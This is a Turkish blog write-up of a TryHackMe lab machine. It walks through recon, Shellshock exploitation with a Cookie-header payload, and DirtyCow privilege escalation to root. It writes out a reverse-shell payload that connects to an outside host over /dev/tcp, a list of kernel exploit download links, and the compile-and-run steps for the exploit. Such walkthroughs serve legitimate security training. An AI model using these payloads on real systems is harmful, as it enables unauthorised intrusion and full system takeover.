---
title: "THM 0Day Write Up"
date: 2020-11-08T14:58:36+03:00
draft: false
toc: true
images:
tags: [Tryhackme,write-up,dirtyCow,shellshock,CVE-2016-5195,CVE-2014-6278] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [0Day](https://tryhackme.com/room/0day) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/thm/0Day/cover.png
  
---
*Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [0Day](https://tryhackme.com/room/0day) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...*
## 1. Keşif Aşaması

Nmap ile port taraması gerçekleştirilir.

```txt
sudo nmap -sV -sC 10.10.119.248
```

{{< image src="/images/thm/0Day/nmap.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Keşif işlemine 80 portunda çalışan web servis üzerinden devam edilir.

{{< image src="/images/thm/0Day/website.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Web sayfası kaynak kodunda herhangi bir bilgi elde edilememektedir. Gobuster ile dizin taraması gerçekleştirilir.

```txt
gobuster dir -u http://10.10.119.248/ -w /usr/share/wordlists/dirb/big.txt -t 10
```
{{< image src="/images/thm/0Day/gobuster.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Epey ilginç dizinler tespit edilmektedir. ***/admin, /uploads, /cgi-bin*** dizinlerine tarayıcı ile istek atıldığında boş sayfa ile karşılaşılmaktadır.

Robots.txt sayfası:

{{< image src="/images/thm/0Day/robots.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

secret sayfası:

{{< image src="/images/thm/0Day/secret.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Backup sayfasında ssh private anahtarı yer almaktadır. Ama malesef anahtar encrypt edilmiş halde olduğundan decrypt edilmeden kullanıamaz. Şimdilik keşif aşamasında devam edilir.

{{< image src="/images/thm/0Day/backuppage.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

***/cgi-bin*** dizini dikkatleri celbetmektedir. Nikto ile web sayfası taranır. 

```txt
nikto --url http://10.10.119.248/ 
```
Tarama sonucunda ***shellshock*** zafiyeti tespit edilmiştir. *Zafiyet kısaca hedef sistemde web sayfaları tarafından gönderilen shell komutlarını çalıştırmayı sağlamaktadır. (GNU Bash Remote Code Execution Güvenlik Açığı)*

{{< image src="/images/thm/0Day/nikto.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Burada zafiyete sebep olan test.cgi dosyası burpsuite aracı kullanılarak ilk etapta test edilir.

{{< image src="/images/thm/0Day/shellshock1.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Görüldüğü üzere yapılan isteğe "hello Word" cevabı döndürmektedir. Zafiyet http başlığındaki cookie, useragent gibi parametler manipüle edilerek sömürülebilir. Burada cookie bilgisi kullanılarak zafiyet sömürülmektedir.

Http başlığına Cookie bilgisi eklenerek test edilir. 
```txt
Cookie: () { :;}; echo;echo "test"
```

{{< image src="/images/thm/0Day/shellshock2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}


## 2. Erişim Sağlanması

Hedef sistemde kod çalıştırılabildiği tespit edilmektedir. Reverse shell bağlantısını sağlayacak shell komutu cookie bilgisine eklenir.

```txt
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.9.62.67/4444 0>&1
```

{{< image src="/images/thm/0Day/shellshock3.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Nc ile dinlenen porta terminal bağlantısı gerçekleşir.

{{< image src="/images/thm/0Day/reverseshell.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

/home dizini altında yer alan kullanıcı dizinleri kontrol edilir. Ryan dizini altında user.txt dosyası okunur.

{{< image src="/images/thm/0Day/userflag.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

## 3. Yetki Yükseltme

Hedef sistemde hakkında bilgi toplamak üzere LinEnum.sh betiği çalıştırılır. Betik sonucunda kernel sürümünün eski olduğu tespit edilir. 

Bu kernel sürümününde yetki yükseltmek üzere kullanılabailecek exploitleri tespit etmek için   [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) betiği çalıştırılır. *(Betiklerin localden hedef sisteme nasıl atılacağı ile ilgili eski write-uplara bakabilirsiniz.)*

```
www-data@ubuntu:/tmp$ chmod +x suggester.sh
chmod +x suggester.sh
www-data@ubuntu:/tmp$ ./suggester.sh
./suggester.sh

Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
   ```
Epey bir uzun çıktı vermektedir. Burada yer alan tüm explotler hedef sistemde çalışmaya bilmektedir. Bazı açıklar path edilmiş olabilmektedir. En dikkat çeken açık ilk sırada yer alan ve epey meşhur olan DirtyCow'dur. *(DirtyCow hakkında daha fazla bilgi için https://canyoupwn.me/tr-dirtycow/)*

DirtyCow kullanılarak yetki yükseltmemizi sağlayacak olan [CowRoot.c](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679) dosyası indirilir. Hedef sistemde derlenerek çalıştırılır.

```
gcc dirtycow.c -o root -pthread
./root
```
{{< image src="/images/thm/0Day/priv.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

/root dizini altında yer alan root.txt dosyası okunarak makina çözümü tamamlanır.

{{< image src="/images/thm/0Day/rootflag.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah'a emanet olun...


